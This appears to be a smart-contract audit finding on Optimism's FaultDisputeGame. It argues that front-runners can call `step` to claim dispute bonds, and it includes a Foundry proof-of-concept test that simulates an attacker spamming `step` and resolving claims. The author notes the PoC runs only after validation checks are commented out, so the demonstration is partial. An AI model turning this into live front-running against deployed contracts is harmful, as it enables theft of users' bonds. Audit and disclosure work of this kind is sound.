Damaged Chartreuse Skunk

medium

# MEV on Bonds, disputes should be commit revealed to prevent them from being stolen by the victim or attackers

## Summary

Because `step` is external and directly rewards the `msg.sender` with a claim front-runners will have the ability of stealing bond payouts at no risk

## Vulnerability Detail

`step` allows the msg.sender to be set as the `parent.counteredBy`

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L214-L219


## Impact

Once this value is set, it cannot be altered, and this has a direct impact on the ability to `resolveClaim`

This means that they will receive a bond for this

This means that anybody can front-run calls to `step` with the goal of stealing bonds


## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L142-L155


In a similar way we can have the attacker spam txs to avoid losing funds

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import "src/dispute/DisputeGameFactory.sol";
import "src/dispute/FaultDisputeGame.sol";
import "src/dispute/AnchorStateRegistry.sol";
import "src/dispute/lib/LibPosition.sol";

contract Logger {
    function log() external {
        console2.log("as", msg.sender);
    }
}

contract FaultDisputesTest is Test {

    uint256 totalReceived;
    fallback () external payable {
        totalReceived += msg.value;
    }

    function testAttackSimple() public {
        DisputeGameFactory factory = new DisputeGameFactory();

        AnchorStateRegistry registry = new AnchorStateRegistry(IDisputeGameFactory(factory));

        FaultDisputeGame firstGame = new FaultDisputeGame(
            GameType.wrap(1),
            Claim.wrap(bytes32(0x0)),
            3, // MAX_DEPTH
            1, // 30 SPLIT_DEPTH
            Duration.wrap(604800), // 7 days

            IBigStepper(address(this)),
            IDelayedWETH(address(this)),
            IAnchorStateRegistry(registry),
            123123
        );

        factory.setImplementation(GameType.wrap(1), IDisputeGame(firstGame));

        AnchorStateRegistry.StartingAnchorRoot[] memory initialRoots = new AnchorStateRegistry.StartingAnchorRoot[](1);
        initialRoots[0].gameType = GameType.wrap(1);
        initialRoots[0].outputRoot = OutputRoot({
            root: Hash.wrap(bytes32(uint256(123123))),
            l2BlockNumber: 1
        });

        registry.initialize(
            initialRoots
        );

        address creator = address(0x9898);
        address attacker = address(0x123123);
        address defender = address(0xddd);
        attacker.call{value: 500e18}("");
        creator.call{value: 500e18}("");
        defender.call{value: 500e18}("");

        factory.setInitBond(GameType.wrap(1), 999);

        vm.startPrank(creator);
        FaultDisputeGame proxy = FaultDisputeGame(payable(address(factory.create{value: 999}(
            GameType.wrap(1),
            Claim.wrap(bytes32(uint256(1231231231))),
            abi.encode(2)
        ))));
        vm.stopPrank();

        
        vm.startPrank(attacker);
        // can we defend the first thing?
        uint256 dur = 0;
        uint256 amt = proxy.getRequiredBond(LibPosition.wrap(uint64(dur+1), 0));
        proxy.move{value: amt}(dur, Claim.wrap(bytes32(uint256(dur+1))), true); // Always an attack
        dur++;

        amt = proxy.getRequiredBond(LibPosition.wrap(uint64(dur+1), 0));
        proxy.move{value: amt}(dur, Claim.wrap(bytes32(uint256(dur+1))), true);

        console2.log("Defender");
        vm.stopPrank();
        vm.startPrank(defender);
        amt = proxy.getRequiredBond(LibPosition.wrap(uint64(dur+1), 0));
        proxy.move{value: amt}(dur, Claim.wrap(bytes32(uint256(dur+1))), false);
        dur++;
        vm.stopPrank();
        vm.startPrank(attacker);

        amt = proxy.getRequiredBond(LibPosition.wrap(uint64(dur+1), 0));
        proxy.move{value: amt}(dur, Claim.wrap(bytes32(uint256(dur+1))), true);
        // amt = proxy.getRequiredBond(LibPosition.wrap(uint64(dur+1), 0)); // Cannot defend root claim
        // proxy.move{value: amt}(dur, Claim.wrap(bytes32(uint256(dur+1))), false);
        dur++;
        vm.stopPrank();

        // Adding more = Game depth exceeded
        uint256 stepFakeDispute = 0;
        while (stepFakeDispute < 15) {
        try proxy.step(
            stepFakeDispute++,
            true, // obv _isAttack so we fail instantly
            hex"",
            hex""
        ) {} catch {}
        }


        vm.warp(block.timestamp + proxy.gameDuration().raw() + 1);

        // Ensures we abundantly resolve all claims
        uint256 counter = 15;
        while (counter > 0) {
            try proxy.resolveClaim(counter--) {} catch {}
        }
        proxy.resolveClaim(counter);
        proxy.resolve();

        console2.log("Result", uint256(proxy.status()));
        console2.log("credit address(0)", proxy.credit(address(0)));
        console2.log("credit Attacker", proxy.credit(attacker));
        console2.log("credit creator", proxy.credit(creator));
        console2.log("credit defender", proxy.credit(defender));
        console2.log("tx.origin", tx.origin);
        console2.log("credit tx.origin", proxy.credit(tx.origin));
        console2.log("Original Claimant", proxy.getOriginalClaimant());
        console2.log("Original Claimant", proxy.credit(proxy.getOriginalClaimant()));
    }
```

To allow the POC to work I commented out these lines:

        // if (keccak256(_stateData) << 8 != preStateClaim.raw() << 8) revert InvalidPrestate(); // NOTE: Commented

    //     if (_isAttack || disputed.position.depth() % 2 == SPLIT_DEPTH % 2) {
    //         // If the move is an attack, the parent output is always deemed to be disputed. In this case, we only need
    //         // to check that the root claim signals that the VM panicked or resulted in an invalid transition.
    //         // If the move is a defense, and the disputed output and creator of the execution trace subgame disagree,
    //         // the root claim should also signal that the VM panicked or resulted in an invalid transition.
    //         if (!(vmStatus == VMStatuses.INVALID.raw() || vmStatus == VMStatuses.PANIC.raw())) {
    //             revert UnexpectedRootClaim(_rootClaim);
    //         }
    //     } else if (vmStatus != VMStatuses.VALID.raw()) {
    //         // The disputed output and the creator of the execution trace subgame agree. The status byte should
    //         // have signaled that the VM succeeded.
    //         revert UnexpectedRootClaim(_rootClaim);
    //     }

## Tool used

Manual Review

## Recommendation

A commit reveal system would need to be set, that would ensure that only the first disputer is rewarded the bond for having done the actual proving